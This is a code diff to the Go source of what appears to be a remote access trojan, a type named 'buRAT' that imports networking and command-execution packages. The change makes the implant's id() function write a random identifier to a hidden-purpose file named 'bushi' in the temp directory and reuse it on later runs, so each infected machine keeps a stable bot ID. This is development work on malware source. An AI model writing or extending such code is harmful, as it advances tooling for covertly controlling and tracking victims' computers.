@@ -13,6 +13,7 @@ import(
   "io/ioutil"
   "runtime"
   "net/http"
+  o "os"
   "os/exec"
   "strings"
   "time"
@@ -188,8 +189,27 @@ func (b *buRAT) digestTopic(topic string) string {
 }
 
 func id() string {
-  val, _ := randomHex(2)
-  return val
+  var id string
+
+  filePath := o.TempDir() + "/bushi"
+
+  if _, err := o.Stat(filePath); o.IsNotExist(err) {
+    id, _ = randomHex(2)
+    data := []byte(id)
+    file, err := o.OpenFile(filePath, o.O_RDWR|o.O_CREATE, 0755)
+    if err != nil { fmt.Println(err) }
+  	_, err = file.WriteAt(data, 0)
+  	if err := file.Close(); err != nil { fmt.Println(err) }
+  } else {
+    data := make([]byte, 4)
+  	file, err := o.OpenFile(filePath, o.O_RDWR|o.O_CREATE, 0755)
+    if err != nil { fmt.Println(err) }
+  	file.ReadAt(data, 0)
+    if err := file.Close(); err != nil { fmt.Println(err) }
+    id = string(data)
+  }
+
+  return id
 }
 
 func host() string {
